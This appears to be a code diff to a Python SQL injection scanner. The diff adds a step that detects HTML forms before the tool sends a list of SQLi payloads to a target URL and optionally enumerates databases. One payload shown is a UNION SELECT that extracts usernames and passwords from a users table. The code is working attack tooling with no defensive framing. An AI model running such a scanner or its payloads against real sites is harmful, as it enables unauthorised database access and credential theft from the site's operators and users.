@@ -1,8 +1,8 @@
 import requests
 from urllib.parse import urljoin, urlparse, urlencode
 import logging
-import time
 from colorama import Fore, init
+from bs4 import BeautifulSoup
 
 # Initialize colorama for colored output
 init(autoreset=True)
@@ -41,23 +41,46 @@ SQLI_PAYLOADS = [
     "' UNION SELECT null, username, password FROM users --"  # Union to get usernames and passwords
 ]
 
-# The function to perform SQLi scanning
-def scan_url(url, session, dbs=False):
+# Function to check for forms
+def has_forms(url, session):
     try:
-        logger.info(f"Scanning: {url}")
         response = session.get(url, timeout=10)
-        
         if response.status_code == 200:
-            if dbs:
-                logger.info("Looking for databases...")
-                test_sqli_dbs(url, session)
+            soup = BeautifulSoup(response.text, 'html.parser')
+            forms = soup.find_all('form')
+            if forms:
+                logger.info(f"[INFO] Forms detected on {url}. Proceeding with SQLi scan.")
+                return True
             else:
-                for payload in SQLI_PAYLOADS:
-                    test_sqli(url, payload, session)
+                logger.warning(f"[INFO] No forms found on {url}. Unable to proceed with SQL injection scan.")
+                return False
         else:
-            logger.warning(f"Failed to fetch {url} - Status code: {response.status_code}")
-    except Exception as e:
-        logger.critical(f"Critical error scanning {url}: {str(e)}")
+            logger.warning(f"[WARNING] Failed to fetch {url} - Status code: {response.status_code}")
+            return False
+    except requests.exceptions.RequestException as e:
+        logger.critical(f"[CRITICAL] Error connecting to {url}: {str(e)}")
+        return False
+
+# SQL Injection scanning function
+def scan_url(url, session, dbs=False):
+    if has_forms(url, session):  # Proceed with scanning only if forms are found
+        try:
+            logger.info(f"Scanning: {url}")
+            response = session.get(url, timeout=10)
+            
+            if response.status_code == 200:
+                if dbs:
+                    logger.info("Looking for databases...")
+                    test_sqli_dbs(url, session)
+                else:
+                    for payload in SQLI_PAYLOADS:
+                        test_sqli(url, payload, session)
+            else:
+                logger.warning(f"Failed to fetch {url} - Status code: {response.status_code}")
+        except Exception as e:
+            logger.critical(f"Critical error scanning {url}: {str(e)}")
+    else:
+        logger.critical(f"Unable to connect to target URL or no forms detected: {url}")
 
 # Function to test SQL Injection vulnerabilities
 def test_sqli(url, payload, session):
